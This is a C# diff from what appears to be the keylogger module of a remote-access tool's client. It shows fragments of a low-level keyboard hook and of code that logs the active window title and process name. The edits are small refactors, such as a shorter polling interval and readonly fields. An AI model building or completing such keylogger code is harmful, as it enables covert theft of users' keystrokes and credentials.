@@ -24,7 +24,7 @@ namespace Client.Handle_Packet
             {
                 while (true)
                 {
-                    Thread.Sleep(1000);
+                    Thread.Sleep(500);
                     if (isON == false)
                     {
                         UnhookWindowsHookEx(_hookID);
@@ -157,9 +157,8 @@ namespace Client.Handle_Packet
         private static string GetActiveWindowTitle()
         {
             const int nChars = 256;
-            IntPtr handle = IntPtr.Zero;
             StringBuilder Buff = new StringBuilder(nChars);
-            handle = GetForegroundWindow();
+            IntPtr handle = GetForegroundWindow();
 
             if (GetWindowText(handle, Buff, nChars) > 0)
             {
@@ -178,8 +177,7 @@ namespace Client.Handle_Packet
             {
                 string pName;
                 IntPtr hwnd = GetForegroundWindow();
-                uint pid;
-                GetWindowThreadProcessId(hwnd, out pid);
+                GetWindowThreadProcessId(hwnd, out uint pid);
                 Process p = Process.GetProcessById((int)pid);
                 pName = Path.GetFileName(p.MainModule.FileName);
 
@@ -194,9 +192,8 @@ namespace Client.Handle_Packet
 
         #region "Hooks & Native Methods"
 
-        private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
-        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static readonly LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
@@ -209,7 +206,7 @@ namespace Client.Handle_Packet
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
-        private static int WHKEYBOARDLL = 13;
+        private static readonly int WHKEYBOARDLL = 13;
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
